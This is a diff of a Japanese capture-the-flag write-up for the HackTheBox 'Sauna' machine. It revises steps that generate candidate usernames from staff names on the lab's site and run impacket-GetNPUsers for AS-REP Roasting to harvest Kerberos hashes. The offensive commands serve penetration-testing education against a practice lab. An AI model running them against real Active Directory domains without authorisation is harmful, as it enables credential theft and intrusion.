@@ -226,6 +226,8 @@ ADマシンでクレデンシャルが0の場合、ユーザ名の種を取る�
 
 `about.html`を眺めていると、Teamセクションに銀行員のフルネームが並んでいる。
 
+![about.htmlのMeet The Teamセクションに銀行員のフルネームが並んでいる](/images/sauna-web-about.png)
+
 ```:about.htmlから拾ったフルネーム
 Fergus Smith
 Shaun Coins
@@ -271,34 +273,19 @@ EOF
 
 ```sh
 ┌──(root㉿5602a1b7889d)-[~/Sauna]
-└─# ./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
+└─# ./username-anarchy -i fullnames.txt > usernames.txt
 
 ┌──(root㉿5602a1b7889d)-[~/Sauna]
-└─# cat unames.txt
+└─# cat usernames.txt
 fergus
-fsmith
+fergussmith
 fergus.smith
+fergussm
+fergsmit
 ferguss
-shaun
-scoins
-shaun.coins
-shaunc
-hugo
-hbear
-hugo.bear
-hugob
-bowie
-btaylor
-bowie.taylor
-bowiet
-sophie
-sdriver
-sophie.driver
-sophied
-steven
-skerb
-steven.kerb
-stevenk
+f.smith
+fsmith
+<SNIP>
 ```
 
 ### AS-REP Roasting
@@ -329,7 +316,7 @@ Kerberosで、AS-REQ送信時にクライアントが「自分の鍵でタイム
 
 ```sh
 ┌──(root㉿5602a1b7889d)-[~/Sauna]
-└─# impacket-GetNPUsers egotistical-bank.local/ -dc-ip ${RHOSTS} -no-pass -usersfile unames.txt -format hashcat -outputfile hashes.txt
+└─# impacket-GetNPUsers egotistical-bank.local/ -dc-ip ${RHOSTS} -no-pass -usersfile usernames.txt -format hashcat -outputfile hashes.txt
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] User fergus doesn't have UF_DONT_REQUIRE_PREAUTH set
